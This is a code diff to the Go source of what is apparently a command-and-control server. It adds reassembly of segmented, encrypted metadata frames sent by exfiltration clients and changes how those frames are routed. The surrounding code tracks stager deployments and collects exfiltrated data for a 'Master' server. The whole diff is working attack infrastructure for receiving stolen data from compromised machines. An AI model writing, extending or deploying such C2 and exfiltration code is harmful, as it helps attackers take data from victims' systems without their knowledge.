@@ -96,6 +96,11 @@ type ExfilTagTracker struct {
 	LastActivity time.Time
 }
 
+type metadataAssembler struct {
+	segments   map[uint32][]byte
+	finalIndex *uint32
+}
+
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
 	ClientIP        string
@@ -128,6 +133,7 @@ type C2Manager struct {
 	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
 	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
 	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
+	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
 	mutex                sync.RWMutex
 	taskCounter          int // Counter for local tasks (standalone mode)
 	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
@@ -173,6 +179,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		expectedResults:      make(map[string]*ExpectedResult),
 		exfilSessions:        make(map[string]*ExfilSession),
 		exfilTagIndex:        make(map[string]*ExfilTagTracker),
+		metadataAssemblers:   make(map[string]*metadataAssembler),
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
@@ -674,13 +681,11 @@ func (c2 *C2Manager) ProcessExfilFrame(frame *ExfilFrame, clientIP string) (bool
 		if frame.Payload == "" {
 			return false, fmt.Errorf("chunk frame missing payload")
 		}
-		if frame.Counter == 0 {
-			if frame.Flags&FrameEnvelopeFlagMetadata == 0 {
-				if c2.debug {
-					logf("[Exfil] metadata chunk missing metadata flag")
-				}
-			}
+		if frame.Flags&FrameEnvelopeFlagMetadata != 0 {
 			return c2.handleExfilMetadataFrame(frame, clientIP)
+		}
+		if frame.Counter == 0 && c2.debug {
+			logf("[Exfil] chunk counter 0 without metadata flag")
 		}
 		return c2.handleExfilDataFrame(frame, clientIP)
 	case ExfilFrameComplete:
@@ -705,16 +710,22 @@ func (c2 *C2Manager) recordExfilInit(tag string, totalFrames uint32) {
 }
 
 func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
-	plaintext, err := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
+	segment, err := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
 	if err != nil {
 		return false, fmt.Errorf("exfil metadata decrypt failed: %w", err)
 	}
 
-	meta, err := parseExfilMetadataPayload(plaintext)
+	isFinal := (frame.Flags & FrameEnvelopeFlagFinal) != 0
+	assembled, complete := c2.appendMetadataSegment(frame.SessionTag, frame.Counter, segment, isFinal)
+	if !complete {
+		return true, nil
+	}
+
+	meta, err := parseExfilMetadataPayload(assembled)
 	if err != nil {
 		return false, fmt.Errorf("exfil metadata parse failed: %w", err)
 	}
-	meta.PayloadLen = uint16(len(plaintext))
+	meta.PayloadLen = uint16(len(assembled))
 
 	now := time.Now()
 	c2.mutex.Lock()
@@ -729,7 +740,7 @@ func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string
 	}
 	c2.mutex.Unlock()
 
-	return c2.handleExfilChunk(frame.Payload, meta, clientIP, plaintext)
+	return c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
 }
 
 func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
@@ -807,12 +818,56 @@ func (c2 *C2Manager) getExfilTagTracker(tag string) (*ExfilTagTracker, bool) {
 
 func (c2 *C2Manager) deleteExfilTagTracker(tag string) {
 	c2.mutex.Lock()
-	delete(c2.exfilTagIndex, normalizeExfilTag(tag))
+	normalized := normalizeExfilTag(tag)
+	delete(c2.exfilTagIndex, normalized)
+	delete(c2.metadataAssemblers, normalized)
 	c2.mutex.Unlock()
 }
 
 func normalizeExfilTag(tag string) string {
 	return strings.ToUpper(tag)
+}
+
+func (m *metadataAssembler) addSegment(index uint32, segment []byte, isFinal bool) ([]byte, bool) {
+	if m.segments == nil {
+		m.segments = make(map[uint32][]byte)
+	}
+	if _, exists := m.segments[index]; !exists {
+		m.segments[index] = append([]byte(nil), segment...)
+	}
+	if isFinal {
+		idx := index
+		m.finalIndex = &idx
+	}
+	if m.finalIndex == nil {
+		return nil, false
+	}
+	finalIdx := *m.finalIndex
+	var buf bytes.Buffer
+	for i := uint32(0); i <= finalIdx; i++ {
+		chunk, ok := m.segments[i]
+		if !ok {
+			return nil, false
+		}
+		buf.Write(chunk)
+	}
+	return buf.Bytes(), true
+}
+
+func (c2 *C2Manager) appendMetadataSegment(tag string, index uint32, segment []byte, isFinal bool) ([]byte, bool) {
+	normalized := normalizeExfilTag(tag)
+	c2.mutex.Lock()
+	assembler, exists := c2.metadataAssemblers[normalized]
+	if !exists {
+		assembler = &metadataAssembler{}
+		c2.metadataAssemblers[normalized] = assembler
+	}
+	payload, complete := assembler.addSegment(index, segment, isFinal)
+	if complete {
+		delete(c2.metadataAssemblers, normalized)
+	}
+	c2.mutex.Unlock()
+	return payload, complete
 }
 
 // handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
